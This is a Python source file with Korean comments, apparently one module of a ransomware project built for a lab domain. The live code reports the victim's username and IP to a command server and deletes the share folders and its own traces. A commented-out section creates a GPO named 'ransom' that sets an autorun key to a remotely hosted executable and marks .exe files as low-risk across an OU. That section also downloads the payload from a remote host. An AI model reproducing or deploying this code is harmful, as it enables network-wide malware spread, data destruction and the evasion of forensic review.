#공유 폴더에서 모든 노드에서 실행하도록 설정되어있음.
#모듈1에게 성공적으로 실행되었음을 전송
#모든 관련파일 삭제(무한루프)
    #GPO
    #모듈2
    #모듈3
    #기타 부산물
#배치파일 생성(%temp% 경로에)
    #모듈4 삭제
    #공유폴더 삭제
    #자가삭제

import os
from re import A
import shutil
import getpass
import os.path
import subprocess
import urllib.request
import socket
import threading

#사용자 이름 획득
c = getpass.getuser()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
e = s.getsockname()[0]
#현재 실행 중인 파일
dri = "moduletest.py"
#정보들
info_List = []

# 1. 통신 모듈
def Socket_Create():
    Host = '192.168.56.1'
    Port = 9999

    global Client_Socket

    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket.connect((Host, Port))

    receive_thread = threading.Thread(target=info_send)
    receive_thread.start()

def info_send():
    print('info_send start')
    while True:
        try:
            msg = Client_Socket.recv(1024).decode('ascii')
            if msg == 'MODULENAME':
                Client_Socket.send(c.encode('ascii'))
                print('send MODULENAME')
            elif msg == 'MODULEIP':
                Client_Socket.send(e.encode('ascii'))
            elif msg == 'M_INFOLIST':
                info_Lists = make_List(info_List)
                Client_Socket.send(info_Lists.encode('ascii'))
            else:
                print(msg)
        except Exception as error:
            print("Error!",error)
            Client_Socket.close()
            break
def make_List(info_List):
    info_Lists = '[M4]\n'
    for info_name, info_state in info_List:
        info_List = info_name + ': ' + info_state + '\n'
        info_Lists += info_List
    return info_Lists

# 2. 삭제 루프
def file_delete():
    try:
        dir_path0 = "C://users/{}/desktop/share1".format(c)
        dir_path1 = "C://users/{}/desktop/share2".format(c)
        dir_path2 = "C://users/{}/desktop/share3".format(c)
        dir_path3 = "C://users/{}/desktop/share4".format(c)
        
        if os.path.exists(dir_path0):
            shutil.rmtree(dir_path0)
            shutil.rmtree(dir_path1) 
            shutil.rmtree(dir_path2)
            shutil.rmtree(dir_path3)

        else:
            if os.path.exists(dir_path1):
                shutil.rmtree(dir_path1) 
                #shutil.rmtree(dir_path2)
                #shutil.rmtree(dir_path3)
                
            else:
                if os.path.exists(dir_path2):
                    shutil.rmtree(dir_path2)
                    shutil.rmtree(dir_path3)
                    
                else:
                    if os.path.exists(dir_path3):
                        shutil.rmtree(dir_path3)

        print("all clear")
        info_List.append(('all clear','Ok'))
    except:
        info_List.append(('all clear','No'))


# 3. 자가 삭제
def self_delete():
    f=open("C:\\users\\{}\\desktop\\killfile.bat".format(c), 'w')
    f.write(":Repeat\n")
    f.write("del /f /s /q {}\n".format(dri))
    f.write("if exist {} goto Repeat\n".format(dri))
    f.write("del /s /q killfile.bat")
    f.close()

    os.startfile('C:\\users\\{}\\desktop\\killfile.bat'.format(c))
    info_List.append(('self delete','Ok'))

# 4. 메인 함수
#통신모듈()
file_delete()
#self_delete()
Socket_Create()

# 부산물 리스트 받아야함. 파일명까지 경로는 배경화면 고정

'''

# 1. 통신 모듈
# 실행완료되었음을 전송(OK)

# 필요 없는 부분이네 왜? 모든 PC에서 실행될꺼니까
# 2. GPO 등록
    # 하단 .bat을 실행하도록 GPO 등록
def gpo_add():
    cmd1 = "powershell.exe new-gpo -name \"ransom\""
    cmd2 = "powershell.exe Set-GPRegistryValue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" -valuename clopransom -type string -value \"\\192.168.16.162\dashboard\c2\hello.exe\""
    cmd3 = "powershell.exe set-gpregistryvalue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\associations\" -valuename LowRiskFileTypes -type string -value \".exe\""
    cmd4 = "powershell.exe \"new-gplink -Name \\\"ransom\\\" -Target \\\"ou=group1,dc=fast,dc=local\\\"\"" 
    cmd5 = "powershell.exe gpupdate /force"

    subprocess.call(cmd1)
    subprocess.call(cmd2)
    subprocess.call(cmd3)
    subprocess.call(cmd4)
    subprocess.call(cmd5)


# 3. share2 경로에 .bat 다운로드
    # 삭제 하는 .bat 생성하는 걸로 변경해야함.(공유폴더 경로에 생성)
def file_download():
    url = "http://192.168.16.162/dashboard/c2/hello.exe"
    path = "C:/Users/user01/Desktop/share2/" + "hello.exe"
    urllib.request.urlretrieve(url, path)


# 4. 관련 파일 삭제(.bat, share2, GPO)
# 모든 행위 끝난 이후 총 삭제
def file_delete():
    dir_path0 = "C://users/user01/desktop"
    dir_path1 = "C://users/user01/desktop/share2"
    dir_path2 = "C://users/user01/desktop/share3"
    dir_path3 = "C://users/user01/desktop/share4"   
    
    if os.path.exists(dir_path0):
        shutil.rmtree(dir_path1)
        shutil.rmtree(dir_path2) 
        shutil.rmtree(dir_path3)

# GPO 삭제

# .bat삭제

# 5. 자가 삭제
    # 관련 파일도 끝난 이후 스스로 삭제
def self_delete():
    f=open("C:\\users\\administrator\\desktop\\killfile.bat", 'w')
    f.write(":Repeat\n")
    f.write("del /f /s /q SelfDelete.exe\n")
    f.write("if exist SelfDelete.exe goto Repeat\n")
    f.write("del /s /q killfile.bat")
    f.close()

    os.startfile('C:\\users\\administrator\\desktop\\killfile.bat')

# 메인 모듈
# 1. 정상 실행 시 모듈 1에 OK 송신
# 2. 모듈 1로부터 OK 수신 시 공유폴더(share2)에 모듈4를 제외한 모든 모듈과 부산물(공유폴더 제외)을 삭제하는 .bat 파일 생성 및 저장
# 3. .bat을 실행하도록 GPO 등록
# if(파일 존재)
# 아무것도 안함
# elif(파일 X)
# GPO, 공유폴더, .bat 삭제하고 자가삭제(5번)
'''